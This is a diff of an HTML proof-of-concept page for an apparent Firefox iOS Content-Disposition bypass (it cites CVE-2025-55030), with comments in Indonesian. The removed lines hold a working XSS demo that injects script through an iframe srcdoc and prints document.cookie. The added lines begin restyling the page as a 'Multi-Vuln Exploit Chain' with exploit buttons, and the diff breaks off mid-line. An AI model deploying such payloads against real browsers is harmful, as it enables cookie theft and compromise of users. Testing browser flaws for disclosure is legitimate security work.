@@ -1,56 +1,60 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Firefox iOS - Content-Disposition XSS PoC</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Firefox iOS Multi-Vuln Exploit Chain</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, sans-serif; background: #000; color: #fff; }
+        .container { padding: 16px; }
+        h1 { font-size: 20px; color: #ff4444; margin-bottom: 10px; }
+        .payload-box {
+            background: #1a1a2e;
+            border: 2px solid #e94560;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 10px 0;
+            text-align: center;
+        }
+        .status { font-size: 14px; color: #aaa; margin: 10px 0; }
+        .btn-exploit {
+            width: 100%;
+            padding: 16px;
+            font-size: 18px;
+            font-weight: bold;
+            background: linear-gradient(135deg, #e94560, #c23152);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            margin: 8px 0;
+        }
+        .btn-exploit:active { transform: scale(0.97); }
+        .log-container {
+            background: #0a0a0a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 12px;
+            font-family: monospace;
+            font-size: 11px;
+            height: 200px;
+            overflow-y: auto;
+            margin-top: 12px;
+            color: #0f0;
+        }
+        .tab-box {
+            background: #16213e;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 10px 0;
+            border-left: 4px solid #e94560;
+        }
+        .tab-box h3 { color: #e94560; font-size: 15px; margin-bottom: 8px; }
+        .tab-box p { font-size: 13px; color: #ccc; line-height: 1.4; }
+    </style>
 </head>
 <body>
-    <h1>Firefox iOS Content-Disposition Bypass PoC</h1>
-    <p>Menguji apakah Firefox iOS mengabaikan Content-Disposition: Attachment header</p>
-    
-    <h2>Test: HTML dirender inline padahal seharusnya di-download</h2>
-    <button onclick="testContentDisposition()" style="padding:15px;font-size:16px;">
-        Load Test Payload
-    </button>
-    
-    <!-- Hidden iframe untuk test -->
-    <iframe id="testFrame" style="width:100%;height:300px;border:1px solid black;margin-top:15px;"></iframe>
-    
-    <script>
-        function testContentDisposition() {
-            var iframe = document.getElementById('testFrame');
-            
-            // Simulasi: konten yang seharusnya attachment/di-download
-            // tapi dirender inline
-            var payload = `
-                <html>
-                <head><title>Malicious Downloaded File</title></head>
-                <body style="font-family:sans-serif;">
-                    <h1 style="color:red;">⚠️ XSS Test Payload</h1>
-                    <p>File ini seharusnya <strong>di-download</strong> (Content-Disposition: attachment)</p>
-                    <p>Tapi Firefox iOS menampilkannya <strong>inline</strong></p>
-                    
-                    <div style="border:2px solid red;padding:20px;margin:20px;background:#ffeeee;">
-                        <h2>Cross-Site Scripting (XSS) Test</h2>
-                        <p id="xssTest">Menunggu eksekusi...</p>
-                        <script>
-                            document.getElementById('xssTest').innerHTML = 
-                                '<span style="color:red;font-weight:bold;">XSS BERHASIL! ' +
-                                'Skrip JavaScript dieksekusi dalam konteks halaman</span>';
-                            
-                            // Coba baca cookie (akan kosong di iframe, tapi PoC)
-                            document.getElementById('xssTest').innerHTML += 
-                                '<br>Document.cookie: ' + (document.cookie || '(empty/httponly)');
-                        <\/script>
-                    </div>
-                    
-                    <p><strong>Referensi:</strong> CVE-2025-55030 - Content-Disposition headers 
-                    incorrectly ignored for some MIME types</p>
-                </body>
-                </html>
-            `;
-            
-            iframe.srcdoc = payload;
-        }
-    </script>
-</body>
-</html>
+<div class="container">
+    <h1>⚠️ Firefox iOS Exploit Chain PoC</h1>
+    <p style="font-size:12px;color
